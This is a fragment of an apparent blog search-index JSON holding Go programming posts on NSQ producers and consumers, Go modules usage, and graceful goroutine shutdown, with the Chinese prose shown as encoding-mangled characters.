\"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\t// è¿æ¥ nsqd çš„ tcp è¿æ¥\n\tproducer, err := nsq.NewProducer(\"127.0.0.1:4150\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// å‘å¸ƒæ¶ˆæ¯\n\tvar count int\n\tfor {\n\t\tcount++\n\t\tbody := fmt.Sprintf(\"test %d\", count)\n\t\tif err := producer.Publish(\"test\", []byte(body)); err != nil {\n\t\t\tlog.Fatal(\"publish error: \" + err.Error())\n\t\t}\n\t\ttime.Sleep(1 * time.Second)\n\t}\n}\n```\n\n### 4.2 æ¶ˆè´¹è€…\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\n\t\"github.com/nsqio/go-nsq\"\n)\n\nfunc main() {\n\tcfg := nsq.NewConfig()\n\tconsumer, err := nsq.NewConsumer(\"test\", \"levonfly\", cfg)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// å¤„ç†ä¿¡æ¯\n\tconsumer.AddHandler(nsq.HandlerFunc(func(message *nsq.Message) error {\n\t\tlog.Println(string(message.Body))\n\t\treturn nil\n\t}))\n\n\t// è¿æ¥ nsqd çš„ tcp è¿æ¥\n\tif err := consumer.ConnectToNSQD(\"127.0.0.1:4150\"); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\t<-consumer.StopChan\n}\n```","tags":["nsq"],"categories":["æ¶ˆæ¯é˜Ÿåˆ—"]},{"title":"golang_moduleåŒ…ç®¡ç†çš„ä½¿ç”¨","url":"%2Fp%2F6c6632b7.html","content":"\n\n\ngolangä»è¯ç”Ÿä¹‹åˆå°±ä¸€ç›´æœ‰ä¸ªè¢«è¯Ÿç—…çš„é—®é¢˜ï¼šç¼ºå°‘ä¸€ä¸ªè¡Œä¹‹æœ‰æ•ˆçš„â€œå®˜æ–¹â€åŒ…ä¾èµ–ç®¡ç†å·¥å…·ã€‚ä¹‹å‰golangåŒ…ç®¡ç†å·¥å…·æœ‰æ•°åä¸ªï¼Œ è¯´å®è¯éƒ½ä¸æ˜¯è®©äººéå¸¸æ»¡æ„ã€‚\n\ngo 1.11 æœ‰äº†å¯¹æ¨¡å—çš„å®éªŒæ€§æ”¯æŒï¼Œå¤§éƒ¨åˆ†çš„å­å‘½ä»¤éƒ½çŸ¥é“å¦‚ä½•å¤„ç†ä¸€ä¸ªæ¨¡å—ï¼Œæ¯”å¦‚ run build install get list mod å­å‘½ä»¤ã€‚go 1.12 ä¼šåˆ é™¤å¯¹ GOPATH çš„æ”¯æŒï¼Œgo get å‘½ä»¤ä¹Ÿä¼šå˜æˆåªèƒ½è·å–æ¨¡å—ï¼Œä¸èƒ½åƒç°åœ¨è¿™æ ·ç›´æ¥è·å–ä¸€ä¸ªè£¸åŒ…ã€‚\n\n\n\n\n\nå¯ä»¥ç”¨ç¯å¢ƒå˜é‡ GO111MODULE å¼€å¯æˆ–å…³é—­æ¨¡å—æ”¯æŒï¼Œå®ƒæœ‰ä¸‰ä¸ªå¯é€‰å€¼ï¼šoffã€onã€autoï¼Œé»˜è®¤å€¼æ˜¯ autoã€‚\n\n- GO111MODULE=off æ— æ¨¡å—æ”¯æŒï¼Œgo ä¼šä» GOPATH å’Œ vendor æ–‡ä»¶å¤¹å¯»æ‰¾åŒ…ã€‚\n- GO111MODULE=on æ¨¡å—æ”¯æŒï¼Œgo ä¼šå¿½ç•¥ GOPATH å’Œ vendor æ–‡ä»¶å¤¹ï¼Œåªæ ¹æ® go.mod ä¸‹è½½ä¾èµ–ã€‚\n- GO111MODULE=auto åœ¨ $GOPATH/src å¤–é¢ä¸”æ ¹ç›®å½•æœ‰ go.mod æ–‡ä»¶æ—¶ï¼Œå¼€å¯æ¨¡å—æ”¯æŒã€‚\n\nåœ¨ä½¿ç”¨æ¨¡å—çš„æ—¶å€™ï¼ŒGOPATH æ˜¯æ— æ„ä¹‰çš„ï¼Œä¸è¿‡å®ƒè¿˜æ˜¯ä¼šæŠŠä¸‹è½½çš„ä¾èµ–å‚¨å­˜åœ¨ $GOPATH/pkg/mod ä¸­ï¼Œä¹Ÿä¼šæŠŠ go install çš„ç»“æœæ”¾åœ¨ $GOPATH/bin ä¸­ã€‚\n\n<!-- more -->\n\n### 1. go mod ä½¿ç”¨æ•™ç¨‹\n\nhttps://github.com/golang/go/wiki/Modules # å®˜æ–¹wiki, åŸºæœ¬æ‰€æœ‰çš„é—®é¢˜éƒ½èƒ½åœ¨è¿™é‡Œæ‰¾åˆ°\n\n\n\n##### 1.1 åœ¨ä½¿ç”¨å‰å…ˆç¡®ä¿golangå‡çº§åˆ°1.11:\n\nhttps://golang.org/dl/ #ä¸‹è½½golang\n\n\n\n### 2. ä½¿ç”¨go mod å®è·µ\n\n\n\n##### 2.1. å¿«é€Ÿå¼€å§‹ï¼š\n\n1. æŠŠä¹‹å‰çš„å·¥ç¨‹æ‹·è´åˆ°$GOPATH/srcä¹‹å¤–\n\n2. åœ¨å·¥ç¨‹ç›®å½•ä¸‹æ‰§è¡Œï¼šgo mod init {module name}ï¼Œè¯¥å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªgo.modæ–‡ä»¶\n\n3. ç„¶ååœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œ go buildï¼Œå°±å¯ä»¥äº†ï¼Œgo.modä¸­è®°å½•äº†ä¾èµ–åŒ…åŠå…¶ç‰ˆæœ¬å·ã€‚\n\n   \n\n##### 2.2. åœ¨ go build ä¸­ é‡åˆ°äº†ä»¥ä¸‹å‡ ä¸ªé—®é¢˜, è®°å½•å¦‚ä¸‹:\n\n\n\n2.2.1 golang.orgçš„åŒ…ç«Ÿç„¶ä¸‹ä¸ä¸‹æ¥(ä½ æ‡‚çš„)\n\nå¯ä»¥ä½¿ç”¨åœ¨go.modé‡Œæ·»åŠ replaceé€‰é¡¹\n\n```go\nreplace (golang.org/x/text => github.com/golang/text v0.3.0 )\n```\n\n ä¹Ÿå¯ä»¥ç”¨ä»£ç†çš„æ–¹å¼, æ›´åŠ æ–¹ä¾¿\n\n```shell\nexport GOPROXY=https://athens.azurefd.net\n```\n\n\n\n2.2.2 å‘ç°æ‰¾ä¸åˆ°åŒ…(åŒ…å±‚çº§å¤šçš„)\n\ncannot load github.com/aliyun/alibaba-cloud-sdk-go/sdk: cannot find module providing package github.com/aliyun/alibaba-cloud-sdk-go/sdk\n\n```shell\ngo get github.com/aliyun/alibaba-cloud-sdk-go@master  #å¸¦@master\n```\n\n\n\n2.2.3 åœ¨æ›¿æ¢çš„æ—¶å€™è¿˜å‘ç°è¿™ä¸ªé”™è¯¯\n\ncannot call non-function xurls.Strict (type *regexp.Regexp)\n\n```shell\nmvdan.cc/xurls  #ä¹‹å‰ç”¨çš„æ˜¯è¿™ä¸ªç‰ˆæœ¬,æ¢æˆä¸‹é¢çš„å°±å¯ä»¥äº†\nmvdan.cc/xurls/v2\n```\n\n\n\n2.2.4  åªæœ‰ç›´æ¥ä½¿ç”¨çš„ä¾èµ–ä¼šè¢«è®°å½•åœ¨`go.mod`æ–‡ä»¶ä¸­, è´´å‡ºgo.modçš„å†…å®¹å¦‚ä¸‹:\n\n```go\nmodule github.com/unix2dos/goods-notify\n\n\n\ngo 1.12\n\n\n\nrequire (\n\n\tgithub.com/PuerkitoBio/goquery v1.5.0\n\n\tgithub.com/aliyun/alibaba-cloud-sdk-go v0.0.0-20190528035818-94084c920892\n\n\tgithub.com/gorilla/websocket v1.4.0 // indirect\n\n\tgithub.com/joho/godotenv v1.3.0\n\n\tgithub.com/pkg/errors v0.8.1 // indirect\n\n\tgithub.com/stretchr/testify v1.3.0\n\n\tgithub.com/unix2dos/bearychat-go v0.0.0-20190222142113-d09d4a5e73e5\n\n\tgithub.com/valyala/fasthttp v1.3.0\n\n\tgithub.com/yunpian/yunpian-go-sdk v0.0.0-20171206021512-2193bf8a7459\n\n\tgolang.org/x/text v0.3.2\n\n\tmvdan.cc/xurls/v2 v2.0.0\n\n)\n```\n\n\n\n`indirect` æ³¨é‡Šæ ‡è®°äº†ä¾èµ–ä¸æ˜¯è¢«å½“å‰æ¨¡å—ç›´æ¥ä½¿ç”¨çš„ï¼Œåªæ˜¯åœ¨å…¶ä»–ä¾èµ–é¡¹ä¸­è¢«é—´æ¥å¼•ç”¨ã€‚\n\n\n\n2.2.5  go.sumæ–‡ä»¶ä»‹ç»\n\nåŒæ—¶ï¼Œ`go.mod`å’Œ`go`å‘½ä»¤ç»´æŠ¤äº†ä¸€ä¸ªåå«`go.sum`çš„æ–‡ä»¶åŒ…å«äº†æŒ‡å®šæ¨¡å—ç‰ˆæœ¬çš„æœŸæœ›çš„[åŠ å¯†hash](https://golang.org/cmd/go/#hdr-Module_downloading_and_verification)ï¼š\n\n`go`å‘½ä»¤ä½¿ç”¨`go.sum`æ–‡ä»¶ä¿è¯ä¹‹åçš„æ¨¡å—ä¸‹è½½ä¼šä¸‹è½½åˆ°è·Ÿç¬¬ä¸€æ¬¡ä¸‹è½½ç›¸åŒçš„æ–‡ä»¶å†…å®¹ï¼Œä¿è¯ä½ çš„é¡¹ç›®ä¾èµ–ä¸ä¼šå‘ç”Ÿé¢„æœŸå¤–çš„æ¶æ„ä¿®æ”¹ã€æ„å¤–é—®é¢˜å’Œå…¶ä»–é—®é¢˜ã€‚`go.mod` å’Œ `go.sum`éƒ½éœ€è¦æ”¾è¿›ç‰ˆæœ¬ç®¡ç†ä¸­ã€‚\n\n\n\n### 3. go mod ç›¸å…³æ“ä½œ\n\n`go list -m all`  å¯ä»¥æŸ¥çœ‹å½“å‰çš„ä¾èµ–å’Œç‰ˆæœ¬(å½“å‰æ¨¡å—ï¼Œæˆ–è€…å«åšä¸»æ¨¡å—ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€è¡Œï¼Œæ¥ä¸‹æ¥æ˜¯æ ¹æ®ä¾èµ–è·¯å¾„æ’åºçš„ä¾èµ–)ã€‚\n\n\n\n`go mod edit -fmt` æ ¼å¼åŒ– `go.mod` æ–‡ä»¶ã€‚\n\n\n\n `go mod tidy` ä» `go.mod` åˆ é™¤ä¸éœ€è¦çš„ä¾èµ–ã€æ–°å¢éœ€è¦çš„ä¾èµ–ï¼Œè¿™ä¸ªæ“ä½œä¸ä¼šæ”¹å˜ä¾èµ–ç‰ˆæœ¬ã€‚\n\n\n\n##### 3.1 go get å‘½ä»¤\n\nè·å–ä¾èµ–çš„ç‰¹å®šç‰ˆæœ¬ï¼Œç”¨æ¥å‡çº§å’Œé™çº§ä¾èµ–ã€‚å¯ä»¥è‡ªåŠ¨ä¿®æ”¹ `go.mod` æ–‡ä»¶ï¼Œè€Œä¸”ä¾èµ–çš„ä¾èµ–ç‰ˆæœ¬å·ä¹Ÿå¯èƒ½ä¼šå˜ã€‚åœ¨ `go.mod` ä¸­ä½¿ç”¨ `exclude` æ’é™¤çš„åŒ…ï¼Œä¸èƒ½ `go get` ä¸‹æ¥ã€‚\n\n\n\nä¸ä»¥å‰ä¸åŒçš„æ˜¯ï¼Œæ–°ç‰ˆ `go get` å¯ä»¥åœ¨æœ«å°¾åŠ  `@` ç¬¦å·ï¼Œç”¨æ¥æŒ‡å®šç‰ˆæœ¬ã€‚\n\nå®ƒè¦æ±‚ä»“åº“å¿…é¡»ç”¨ `v1.2.0` æ ¼å¼æ‰“ tagï¼Œåƒ `v1.2` å°‘ä¸ªé›¶éƒ½ä¸è¡Œçš„ï¼Œå¿…é¡»æ˜¯[è¯­ä¹‰åŒ–](https://semver.org/lang/zh-CN/)çš„ã€å¸¦ `v` å‰ç¼€çš„ç‰ˆæœ¬å·ã€‚\n\n\n\n```\ngo get github.com/gorilla/mux           # åŒ¹é…æœ€æ–°çš„ä¸€ä¸ª tag\ngo get github.com/gorilla/mux@latest    # å’Œä¸Šé¢ä¸€æ ·\ngo get github.com/gorilla/mux@v1.6.2    # åŒ¹é… v1.6.2\ngo get github.com/gorilla/mux@e3702bed2 # åŒ¹é… v1.6.2\ngo get github.com/gorilla/mux@c856192   # åŒ¹é… c85619274f5d\ngo get github.com/gorilla/mux@master    # åŒ¹é… master åˆ†æ”¯\n```\n\n\n\n`latest` åŒ¹é…æœ€æ–°çš„ tagã€‚\n\n`v1.2.6` å®Œæ•´ç‰ˆæœ¬çš„å†™æ³•ã€‚\n\n`v1`ã€`v1.2` åŒ¹é…å¸¦è¿™ä¸ªå‰ç¼€çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¦‚æœæœ€æ–°ç‰ˆæ˜¯ `1.2.7`ï¼Œå®ƒä»¬ä¼šåŒ¹é… `1.2.7`ã€‚\n\n`c856192` ç‰ˆæœ¬ hash å‰ç¼€ã€åˆ†æ”¯åã€æ— è¯­ä¹‰åŒ–çš„æ ‡ç­¾ï¼Œåœ¨ `go.mod` é‡Œéƒ½ä¼šä¼šä½¿ç”¨çº¦å®šå†™æ³• `v0.0.0-20180517173623-c85619274f5d`ï¼Œä¹Ÿè¢«ç§°ä½œä¼ªç‰ˆæœ¬ã€‚\n\n`go get` å¯ä»¥æ¨¡ç³ŠåŒ¹é…ç‰ˆæœ¬å·ï¼Œä½† `go.mod` æ–‡ä»¶åªä½“ç°å®Œæ•´çš„ç‰ˆæœ¬å·ï¼Œå³ `v1.2.0`ã€`v0.0.0-20180517173623-c85619274f5d`ï¼Œåªä¸è¿‡ä¸éœ€è¦æ‰‹å†™è¿™ä¹ˆé•¿çš„ç‰ˆæœ¬å·ï¼Œç”¨ `go get` æˆ–ä¸Šæ–‡çš„ `go mod edit -require` æ¨¡ç³ŠåŒ¹é…å³å¯ï¼Œå®ƒä¼šæŠŠåŒ¹é…åˆ°çš„å®Œæ•´ç‰ˆæœ¬å·å†™è¿› `go.mod`  æ–‡ä»¶ã€‚\n\n\n\n\n\nå‚è€ƒèµ„æ–™:\n\nhttps://github.com/golang/go/wiki/Modules\n\nhttps://www.jianshu.com/p/c5733da150c6\n\nhttps://www.4async.com/2019/03/using-go-modules/","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"golangä¼˜é›…çš„ç­‰å¾…æˆ–é€šçŸ¥goroutineé€€å‡º","url":"%2Fp%2Faca47db0.html","content":"\n# 1. ç­‰å¾…goroutineé€€å‡º\n\n### 1.1 é€šè¿‡Channelä¼ é€’é€€å‡ºä¿¡å·\n\nGoçš„ä¸€å¤§è®¾è®¡å“²å­¦å°±æ˜¯ï¼šé€šè¿‡Channelå…±äº«æ•°æ®ï¼Œè€Œä¸æ˜¯é€šè¿‡å…±äº«å†…å­˜å…±äº«æ•°æ®ã€‚ä¸»æµç¨‹å¯ä»¥é€šè¿‡channelå‘ä»»ä½•goroutineå‘é€åœæ­¢ä¿¡å·ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š\n\n\n\nè¿™ç§æ–¹å¼å¯ä»¥å®ç°ä¼˜é›…åœ°åœæ­¢goroutineï¼Œä½†æ˜¯å½“goroutineç‰¹åˆ«å¤šçš„æ—¶å€™ï¼Œè¿™ç§æ–¹å¼ä¸ç®¡åœ¨ä»£ç ç¾è§‚ä¸Šè¿˜æ˜¯ç®¡ç†ä¸Šéƒ½æ˜¾å¾—ç¬¨æ‹™ä¸å ªã€‚\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"time\"\n)\n\nfunc run(done chan int) {\n   for {\n      select {\n      case <-done:\n         fmt.Println(\"exiting...\")\n         done <- 1\n         break\n      default:\n      }\n\n      time.Sleep(time.Second * 1)\n      fmt.Println(\"do something\")\n   }\n}\n\nfunc main() {\n   c := make(chan int)\n\n   go run(c)\n\n   fmt.Println(\"wait\")\n   time.Sleep(time.Second * 5)\n\n   c <- 1\n   <-c\n\n   fmt.Println(\"main exited\")\n}\n```\n\n<!-- more -->\n\n### 1.2 ä½¿ç”¨Waitgroup\n\né€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åƒä¸‹é¢è¿™æ ·ä½¿ç”¨waitgroup:\n\n1. åˆ›å»ºä¸€ä¸ªWaitgroupçš„å®ä¾‹ï¼Œå‡è®¾æ­¤å¤„æˆ‘ä»¬å«å®ƒwg\n2. åœ¨æ¯ä¸ªgoroutineå¯åŠ¨çš„æ—¶å€™ï¼Œè°ƒç”¨wg.Add(1)ï¼Œè¿™ä¸ªæ“ä½œå¯ä»¥åœ¨goroutineå¯åŠ¨ä¹‹å‰è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨goroutineé‡Œé¢è°ƒç”¨ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨åˆ›å»ºnä¸ªgoroutineå‰è°ƒç”¨wg.Add(n)\n3. å½“æ¯ä¸ªgoroutineå®Œæˆä»»åŠ¡åï¼Œè°ƒç”¨wg.Done()\n4. åœ¨ç­‰å¾…æ‰€æœ‰goroutineçš„åœ°æ–¹è°ƒç”¨wg.Wait()ï¼Œå®ƒåœ¨æ‰€æœ‰æ‰§è¡Œäº†wg.Add(1)çš„goroutineéƒ½è°ƒç”¨å®Œwg.Done()å‰é˜»å¡ï¼Œå½“æ‰€æœ‰goroutineéƒ½è°ƒç”¨å®Œwg.Done()ä¹‹åå®ƒä¼šè¿”å›ã€‚\n\né‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬çš„goroutineæ˜¯ä¸€åŒ¹ä¸çŸ¥ç–²å€¦çš„ç‰›ï¼Œä¸€ç›´å­œå­œä¸å€¦åœ°å·¥ä½œçš„è¯ï¼Œå¦‚ä½•åœ¨ä¸»æµç¨‹ä¸­å‘ŠçŸ¥å¹¶ç­‰å¾…å®ƒé€€å‡ºå‘¢ï¼Ÿåƒä¸‹é¢è¿™æ ·åšï¼š\n\n\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"os\"\n   \"os/signal\"\n   \"sync\"\n   \"syscall\"\n)\n\ntype Service struct {\n   // Other things\n\n   ch        chan bool\n   waitGroup *sync.WaitGroup\n}\n\nfunc NewService() *Service {\n   s := &Service{\n      // Init Other things\n      ch:        make(chan bool),\n      waitGroup: &sync.WaitGroup{},\n   }\n\n   return s\n}\n\nfunc (s *Service) Stop() {\n   close(s.ch)\n   s.waitGroup.Wait()\n}\n\nfunc (s *Service) Serve() {\n   s.waitGroup.Add(1)\n   defer s.waitGroup.Done()\n\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n      s.waitGroup.Add(1)\n      go s.anotherServer()\n   }\n}\nfunc (s *Service) anotherServer() {\n   defer s.waitGroup.Done()\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n\n      // Do something\n   }\n}\n\nfunc main() {\n\n   service := NewService()\n   go service.Serve()\n\n   // Handle SIGINT and SIGTERM.\n   ch := make(chan os.Signal)\n   signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)\n   fmt.Println(<-ch)\n\n   // Stop the service gracefully.\n   service.Stop()\n}\n```\n\n\n\n# 2. é€šçŸ¥ goroutine é€€å‡º\n\n\n\næœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦é€šçŸ¥goroutineåœæ­¢å®ƒæ­£åœ¨å¹²çš„äº‹æƒ…ï¼Œæ¯”å¦‚ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œè®¡ç®—çš„webæœåŠ¡ï¼Œç„¶è€Œå®ƒçš„å®¢æˆ·ç«¯å·²ç»æ–­å¼€äº†å’ŒæœåŠ¡ç«¯çš„è¿æ¥ã€‚\n\nGoè¯­è¨€å¹¶æ²¡æœ‰æä¾›åœ¨ä¸€ä¸ªgoroutineä¸­ç»ˆæ­¢å¦ä¸€ä¸ªgoroutineçš„æ–¹æ³•ï¼Œç”±äºè¿™æ ·ä¼šå¯¼è‡´goroutineä¹‹é—´çš„å…±äº«å˜é‡è½åœ¨æœªå®šä¹‰çš„çŠ¶æ€ä¸Šã€‚\n\nåœ¨rocket launchç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¾€åå­—å«abortçš„channelé‡Œå‘é€äº†ä¸€ä¸ªç®€å•çš„å€¼ï¼Œåœ¨countdownçš„goroutineä¸­ä¼šæŠŠè¿™ä¸ªå€¼ç†è§£ä¸ºè‡ªå·±çš„é€€å‡ºä¿¡å·ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦é€€å‡ºä¸¤ä¸ªæˆ–è€…ä»»æ„å¤šä¸ªgoroutineæ€ä¹ˆåŠå‘¢ï¼Ÿ\n\n\n\nä¸€ç§å¯èƒ½çš„æ‰‹æ®µæ˜¯å‘abortçš„channelé‡Œå‘é€å’Œgoroutineæ•°ç›®ä¸€æ ·å¤šçš„äº‹ä»¶æ¥é€€å‡ºå®ƒä»¬ã€‚å¦‚æœè¿™äº›goroutineä¸­å·²ç»æœ‰ä¸€äº›è‡ªå·±é€€å‡ºäº†ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æˆ‘ä»¬çš„channelé‡Œçš„äº‹ä»¶æ•°æ¯”goroutineè¿˜å¤šï¼Œè¿™æ ·å¯¼è‡´æˆ‘ä»¬çš„å‘é€ç›´æ¥è¢«é˜»å¡ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœè¿™äº›goroutineåˆç”Ÿæˆäº†å…¶å®ƒçš„goroutineï¼Œæˆ‘ä»¬çš„channelé‡Œçš„æ•°ç›®åˆå¤ªå°‘äº†ï¼Œæ‰€ä»¥æœ‰äº›goroutineå¯èƒ½ä¼šæ— æ³•æ¥æ”¶åˆ°é€€å‡ºæ¶ˆæ¯ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯å¾ˆéš¾çŸ¥é“åœ¨æŸä¸€ä¸ªæ—¶åˆ»å…·ä½“æœ‰å¤šå°‘ä¸ªgoroutineåœ¨è¿è¡Œç€çš„ã€‚\n\n\n\nå¦å¤–ï¼Œå½“ä¸€ä¸ªgoroutineä»abort channelä¸­æ¥æ”¶åˆ°ä¸€ä¸ªå€¼çš„æ—¶å€™ï¼Œä»–ä¼šæ¶ˆè´¹æ‰è¿™ä¸ªå€¼ï¼Œè¿™æ ·å…¶å®ƒçš„goroutineå°±æ²¡æ³•çœ‹åˆ°è¿™æ¡ä¿¡æ¯ã€‚ä¸ºäº†èƒ½å¤Ÿè¾¾åˆ°æˆ‘ä»¬é€€å‡ºgoroutineçš„ç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ›´é è°±çš„ç­–ç•¥ï¼Œæ¥é€šè¿‡ä¸€ä¸ªchannelæŠŠæ¶ˆæ¯å¹¿æ’­å‡ºå»ï¼Œè¿™æ ·goroutineä»¬èƒ½å¤Ÿçœ‹åˆ°è¿™æ¡äº‹ä»¶æ¶ˆæ¯ï¼Œå¹¶ä¸”åœ¨äº‹ä»¶å®Œæˆä¹‹åï¼Œå¯ä»¥çŸ¥é“è¿™ä»¶äº‹å·²ç»å‘ç”Ÿè¿‡äº†ã€‚\n\n\n\nå›å¿†ä¸€ä¸‹æˆ‘ä»¬å…³é—­äº†ä¸€ä¸ªchannelå¹¶ä¸”è¢«æ¶ˆè´¹æ‰äº†æ‰€æœ‰å·²å‘é€çš„å€¼ï¼Œæ“ä½œchannelä¹‹åçš„ä»£ç å¯ä»¥ç«‹å³è¢«æ‰§è¡Œï¼Œå¹¶ä¸”ä¼šäº§ç”Ÿé›¶å€¼ã€‚æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæœºåˆ¶æ‰©å±•ä¸€ä¸‹ï¼Œæ¥ä½œä¸ºæˆ‘ä»¬çš„å¹¿æ’­æœºåˆ¶ï¼š**ä¸è¦å‘channelå‘é€å€¼ï¼Œè€Œæ˜¯ç”¨å…³é—­ä¸€ä¸ªchannelæ¥è¿›è¡Œå¹¿æ’­ã€‚**\n\n\n\n\n\n# 3. æ§åˆ¶ goroutine é€€å‡º\n\né€šå¸¸`Goroutine`ä¼šå› ä¸ºä¸¤ç§æƒ…å†µé˜»å¡ï¼š\n\n1. IOæ“ä½œï¼Œæ¯”å¦‚å¯¹`Socket`çš„`Read`ã€‚\n2. `channel`æ“ä½œã€‚å¯¹ä¸€ä¸ªchançš„è¯»å†™éƒ½æœ‰å¯èƒ½é˜»å¡`Goroutine`ã€‚\n\n\n\nå¯¹äºæƒ…å†µ1ï¼Œåªéœ€è¦å…³é—­å¯¹åº”çš„æè¿°ç¬¦ï¼Œé˜»å¡çš„`Goroutine`è‡ªç„¶ä¼šè¢«å”¤é†’ã€‚\n\né‡ç‚¹è®¨è®ºæƒ…å†µ2ã€‚å¹¶å‘ç¼–ç¨‹ï¼Œ`Goroutine`æä¾›ä¸€ç§`channel`æœºåˆ¶ï¼Œ`channel`ç±»ä¼¼ç®¡é“ï¼Œå†™å…¥è€…å‘é‡Œé¢å†™å…¥æ•°æ®ï¼Œè¯»å–è€…ä»ä¸­è¯»å–æ•°æ®ã€‚å¦‚æœ`channel`é‡Œé¢æ²¡æœ‰æ•°æ®ï¼Œè¯»å–è€…å°†é˜»å¡ï¼Œç›´åˆ°æœ‰æ•°æ®ï¼›å¦‚æœ`channel`é‡Œé¢æ•°æ®æ»¡äº†ï¼Œå†™å…¥è€…å°†å› ä¸ºæ— æ³•ç»§ç»­å†™å…¥æ•°æ®è€Œé˜»å¡ã€‚\n\nå¦‚æœåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸé‡Œï¼Œwriterå’Œreaderéƒ½è¡¨ç°ä¸ºä¸€ä¸ª`Goroutine`ï¼Œå§‹ç»ˆéƒ½åœ¨å·¥ä½œï¼Œé‚£ä¹ˆå¦‚ä½•åœ¨åº”ç”¨ç¨‹åºç»“æŸå‰ï¼Œé€šçŸ¥å®ƒä»¬ç»ˆæ­¢å‘¢ï¼Ÿåœ¨Goä¸­ï¼Œå¹¶ä¸æ¨èåƒabortçº¿ç¨‹é‚£æ ·ï¼Œå¼ºè¡Œçš„ç»ˆæ­¢`Goroutine`ã€‚å› æ­¤ï¼ŒæŠ½è±¡çš„è¯´ï¼Œå¿…ç„¶éœ€è¦ä¿ç•™ä¸€ä¸ªå…¥å£ï¼Œèƒ½å¤Ÿè·Ÿwriteræˆ–readeré€šä¿¡ï¼Œä»¥å‘ŠçŸ¥å®ƒä»¬ç»ˆæ­¢ã€‚\n\n \n\n\n\næˆ‘ä»¬å…ˆçœ‹readerã€‚æˆ‘ä»¬é¦–å…ˆå¯ä»¥æƒ³åˆ°ï¼Œåˆ©ç”¨`close`å‡½æ•°å…³é—­æ­£åœ¨è¯»å–çš„`channel`ï¼Œä»è€Œå¯ä»¥å”¤é†’readerï¼Œå¹¶é€€å‡ºã€‚ä½†æ˜¯è€ƒè™‘åˆ°`close`å¹¶ä¸èƒ½å¾ˆå¥½çš„å¤„ç†writerï¼ˆå› ä¸ºwriterè¯•å›¾å†™å…¥ä¸€ä¸ªå·²ç»closeçš„channelï¼Œå°†å¼•å‘å¼‚å¸¸ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è®¾è®¡ä¸€ä¸ªé¢å¤–çš„åªè¯»`channel`ç”¨äºé€šçŸ¥ï¼š\n\n```\ntype routineSignal struct {\n    done <-chan struct{}\n}\n```\n\n `routineSignal`çš„å®ä¾‹ï¼Œåº”å½“é€šè¿‡å¤–éƒ¨ç”Ÿæˆå¹¶ä¼ é€’ç»™readerï¼Œä¾‹å¦‚ï¼š\n\n```\nfunc (r *reader)init(s *routineSignal) {\n    r.signal = s\n}\n```\n\n åœ¨readerçš„å¾ªç¯ä¸­ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š\n\n```\nfunc (r *reader)loop() {\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\nå½“éœ€è¦ç»ˆæ­¢`Goroutine`çš„æ—¶å€™åªéœ€è¦å…³é—­è¿™ä¸ªé¢å¤–çš„`channel`ï¼š\n\n```\nclose(signal.done)\n```\n\n \n\n\n\nçœ‹èµ·æ¥å¾ˆå®Œå¤‡äº†ï¼Œè¿™å¯ä»¥å¤„ç†å¤§éƒ¨åˆ†çš„æƒ…å†µäº†ã€‚è¿™æ ·åšæœ‰ä¸ªå¼Šç«¯ï¼Œå°½ç®¡ï¼Œæˆ‘ä»¬å¯ä»¥æœŸæœ›`close`å”¤é†’`Goroutine`è¿›è€Œé€€å‡ºï¼Œä½†æ˜¯å¹¶ä¸èƒ½çŸ¥é“`Goroutine`ä»€ä¹ˆæ—¶å€™å®Œæˆé€€å‡ºï¼Œå› ä¸º`Goroutine`å¯èƒ½åœ¨é€€å‡ºå‰è¿˜æœ‰ä¸€äº›å–„åå·¥ä½œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦`sync.WaitGroup`ã€‚æ”¹é€ ä¸€ä¸‹`routineSignal`ï¼š\n\n\n\n```\ntype routineSignal struct {\n    done chan struct{}\n    wg   sync.WaitGroup\n}\n```\n\n\n\nå¢åŠ ä¸€ä¸ªsync.WaitGroupçš„å®ä¾‹ï¼Œåœ¨`Goroutine`å¼€å§‹å·¥ä½œæ—¶ï¼Œå¯¹wgåŠ 1ï¼Œåœ¨`Goroutine`é€€å‡ºå‰ï¼Œå¯¹wgå‡1ï¼š\n\n```\nfunc (r *reader)loop() {\n    r.signal.wg.Add(1)\n    defer r.signal.wg.Done()\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n 